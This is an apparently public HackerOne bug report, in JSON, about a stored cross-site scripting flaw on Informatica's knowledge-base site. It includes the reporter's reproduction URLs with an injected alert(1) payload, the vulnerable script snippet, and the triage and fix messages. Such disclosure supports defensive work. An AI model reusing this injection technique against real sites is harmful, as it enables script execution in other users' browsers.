{"id":170369,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzAzNjk=","url":"https://hackerone.com/reports/170369","title":"[kb.informatica.com] Stored XSS","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-09-19T09:07:25.925Z","submitted_at":"2016-09-19T09:07:25.925Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"albinowax","url":"/albinowax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":453,"url":"https://hackerone.com/informatica","handle":"informatica","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Informatica","twitter_handle":"informatica","website":"https://www.informatica.com/","about":"Informatica Corporation is the worldâ€™s number one independent provider of data integration software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-09T12:22:44.923Z","bug_reporter_agreed_on_going_public_at":"2017-03-10T12:22:36.237Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"kb.informatica.org is vulnerable to stored XSS as it stores user input in users' sessions, then reflects this input back inside a JavaScript block without adequate escaping.\n\nTo replicate this issue, first store the payload in your session by visiting: https://kb.informatica.com/kbexternal/Pages/KBSearchResults.aspx?k=Support%20Console\u0026fromsource=11171\"%3balert(1)%2f%2f535\n\nThen visit https://kb.informatica.com/faq/1/Pages/17033.aspx?docid=17033\u0026type=external\u0026isSearch=external\n\nThis should trigger an alert, due to the following HTML in the second response: \n\u003cscript type=\"text/javascript\"\u003e\n//\u003c![CDATA[\nvar isExternal = true; var varSearchResultURL = \"http://kb.informatica.com:7001/kbexternal/Pages/KBSearchResults.aspx?k=Support Console\u0026fromsource=11171\";alert(1)//535\";\n\nReplicating this may take a few attempts - it's a bit flaky. I used Firefox but it ought to work in any browser. Let me know if you have trouble.","vulnerability_information_html":"\u003cp\u003ekb.informatica.org is vulnerable to stored XSS as it stores user input in users\u0026#39; sessions, then reflects this input back inside a JavaScript block without adequate escaping.\u003c/p\u003e\n\n\u003cp\u003eTo replicate this issue, first store the payload in your session by visiting: \u003ca title=\"https://kb.informatica.com/kbexternal/Pages/KBSearchResults.aspx?k=Support%20Console\u0026amp;fromsource=11171%22%3balert(1)%2f%2f535\" href=\"/redirect?url=https%3A%2F%2Fkb.informatica.com%2Fkbexternal%2FPages%2FKBSearchResults.aspx%3Fk%3DSupport%2520Console%26fromsource%3D11171%2522%253balert%281%29%252f%252f535\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://kb.informatica.com/kbexternal/Pages/KBSearchResults.aspx?k=Support%20Console\u0026amp;fromsource=11171%22%3balert(1)%2f%2f535\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThen visit \u003ca title=\"https://kb.informatica.com/faq/1/Pages/17033.aspx?docid=17033\u0026amp;type=external\u0026amp;isSearch=external\" href=\"/redirect?url=https%3A%2F%2Fkb.informatica.com%2Ffaq%2F1%2FPages%2F17033.aspx%3Fdocid%3D17033%26type%3Dexternal%26isSearch%3Dexternal\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://kb.informatica.com/faq/1/Pages/17033.aspx?docid=17033\u0026amp;type=external\u0026amp;isSearch=external\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis should trigger an alert, due to the following HTML in the second response: \u003cbr\u003e\n\u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt;\u003cbr\u003e\n//\u0026lt;![CDATA[\u003cbr\u003e\nvar isExternal = true; var varSearchResultURL = \u0026quot;\u003ca title=\"http://kb.informatica.com:7001/kbexternal/Pages/KBSearchResults.aspx?k=Support\" href=\"/redirect?url=http%3A%2F%2Fkb.informatica.com%3A7001%2Fkbexternal%2FPages%2FKBSearchResults.aspx%3Fk%3DSupport\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://kb.informatica.com:7001/kbexternal/Pages/KBSearchResults.aspx?k=Support\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e Console\u0026amp;fromsource=11171\u0026quot;;alert(1)//535\u0026quot;;\u003c/p\u003e\n\n\u003cp\u003eReplicating this may take a few attempts - it\u0026#39;s a bit flaky. I used Firefox but it ought to work in any browser. Let me know if you have trouble.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-09T12:22:36.275Z","allow_singular_disclosure_after":-117476289.83943325,"singular_disclosure_allowed":true,"vote_count":7,"voters":["bogdantcaciuc","proabiral","eveeez","alfredsaonoy","bb00x","spetr0x","parmanand26"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1204578,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @albinowax,\n\nThank you for your report. We have assessed it and determined that the issue you have disclosed is valid. It has been submitted to our technical teams, and we will notify you once the issue has been resolved. Thank you for your efforts in helping keep Informatica safe! We look forward to your future submissions.\n\nRegards,\n-The Informatica Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report. We have assessed it and determined that the issue you have disclosed is valid. It has been submitted to our technical teams, and we will notify you once the issue has been resolved. Thank you for your efforts in helping keep Informatica safe! We look forward to your future submissions.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n-The Informatica Team\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-19T18:14:09.875Z","updated_at":"2016-09-19T18:14:09.875Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1204580,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-19T18:14:48.056Z","updated_at":"2016-09-19T18:14:48.056Z","additional_data":{"old_title":"Stored XSS on kb.informatica.org","new_title":"[kb.informatica.org] Stored XSS"},"actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1230821,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-04T10:13:24.221Z","updated_at":"2016-10-04T10:13:24.221Z","additional_data":{"old_title":"[kb.informatica.org] Stored XSS","new_title":"[kb.informatica.com] Stored XSS"},"actor":{"username":"gsvivek","cleared":false,"url":"/gsvivek","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1235607,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-06T14:32:39.060Z","updated_at":"2016-10-06T14:32:39.060Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":390},"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1377877,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @albinowax,\n\nA fix has been pushed to production. Can you please test and see if the issue can still be reproduced?\n\nThank you!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eA fix has been pushed to production. Can you please test and see if the issue can still be reproduced?\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-20T20:29:19.552Z","updated_at":"2016-12-20T20:29:19.552Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1378919,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks fixed from here.","markdown_message":"\u003cp\u003eLooks fixed from here.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-21T09:17:01.578Z","updated_at":"2016-12-21T09:17:01.578Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1382104,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @albinowax,\n\nOur team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!\n\nRegards,\nThe Informatica Team","markdown_message":"\u003cp\u003eHello \u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eOur team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nThe Informatica Team\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-22T18:31:35.614Z","updated_at":"2016-12-22T18:31:35.614Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"albinowax","url":"/albinowax"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1507218,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-27T05:01:37.810Z","updated_at":"2017-02-27T05:01:37.810Z","additional_data":{"old_severity":"Medium","new_severity":"High","old_severity_id":390,"new_severity_id":28029},"actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1532113,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-10T12:22:36.253Z","updated_at":"2017-03-10T12:22:36.253Z","first_to_agree":true,"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1556273,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-22T04:38:24.552Z","updated_at":"2017-03-22T04:38:24.552Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"reporter":{"username":"albinowax","url":"/albinowax"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1600800,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-09T12:22:44.939Z","updated_at":"2017-04-09T12:22:44.939Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}